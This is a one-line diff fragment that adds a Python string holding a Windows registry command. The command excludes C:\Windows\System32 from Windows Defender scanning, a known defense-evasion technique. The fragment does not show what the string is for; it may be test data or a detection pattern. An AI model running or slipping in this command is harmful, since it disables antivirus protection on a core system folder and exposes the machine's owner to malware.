@@ -1,0 +1,1 @@
+r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Windows\System32" /t REG_SZ /d "C:\Windows\System32" /f'
